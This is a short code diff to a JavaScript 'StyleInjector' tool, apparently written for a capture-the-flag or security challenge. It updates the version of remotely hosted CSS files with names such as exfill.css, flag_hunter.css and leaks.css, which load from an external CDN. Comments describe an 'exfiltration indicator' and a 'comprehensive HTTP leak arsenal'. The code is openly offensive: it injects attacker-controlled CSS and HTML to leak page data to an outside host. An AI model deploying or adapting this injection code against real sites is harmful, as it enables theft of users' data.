@@ -128,11 +128,11 @@ const StyleInjector = {
     },
     
     injectBasic(nonce) {
-        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/basic.css');
+        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.11/basic.css');
     },
 
     injectComp(nonce) {
-        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/comp.css');
+        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.11/comp.css');
     },
     
     injectVomp(nonce) {
@@ -196,7 +196,7 @@ const StyleInjector = {
     },
     
     injectExfill(nonce) {
-        const result = this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/exfill.css');
+        const result = this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.11/exfill.css');
         
         // Add exfiltration indicator
         const indicator = document.createElement('div');
@@ -208,14 +208,14 @@ const StyleInjector = {
     },
     
     injectHunter(nonce) {
-        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/flag_hunter.css');
+        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.11/flag_hunter.css');
     },
 
     injectAllLeaks(nonce) {
         console.log('💥 [INJECT] Deploying comprehensive HTTP leak arsenal...');
         
         // 1. Load comprehensive leak CSS file
-        const cssResult = this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/leaks.css');
+        const cssResult = this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.11/leaks.css');
         
         // 2. HTML Element Injection for additional leak vectors
         this.injectHTMLLeaks(nonce);
